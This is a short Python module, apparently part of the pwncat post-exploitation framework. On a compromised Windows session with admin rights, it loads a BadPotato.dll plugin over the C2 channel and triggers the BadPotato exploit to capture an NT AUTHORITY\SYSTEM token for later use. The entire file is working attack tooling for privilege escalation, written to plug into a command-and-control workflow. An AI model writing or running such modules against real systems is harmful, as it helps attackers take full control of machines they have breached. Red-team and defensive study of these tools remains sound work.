#!/usr/bin/env python3

import pwncat
from pwncat.modules import Status, ModuleFailed
from pwncat.facts.windows import UserToken
from pwncat.platform.windows import Windows, ProtocolError
from pwncat.modules.enumerate import Scope, Schedule, EnumerateModule


class Module(EnumerateModule):
    """Execute the BadPotato expoit to leak a SYSTEM user token"""

    PLATFORM = [Windows]
    SCHEDULE = Schedule.PER_USER
    SCOPE = Scope.SESSION
    PROVIDES = ["token", "ability.execute"]

    def enumerate(self, session: "pwncat.manager.Session"):

        # Non-admin users will crash the C2 if we try bad potato
        if not session.platform.is_admin():
            return

        try:
            # Load the badpotato plugin
            yield Status("loading badpotato c2 plugin...")
            badpotato = session.platform.dotnet_load("BadPotato.dll")

            # Grab a system token
            yield Status("triggering badpotato exploit...")
            token = badpotato.get_system_token()

            # Yield the new SYSTEM token
            yield UserToken(
                source=self.name,
                uid=session.find_user(name="NT AUTHORITY\\SYSTEM").id,
                token=token,
            )
        except ProtocolError as exc:
            raise ModuleFailed(f"failed to load badpotato: {exc}")
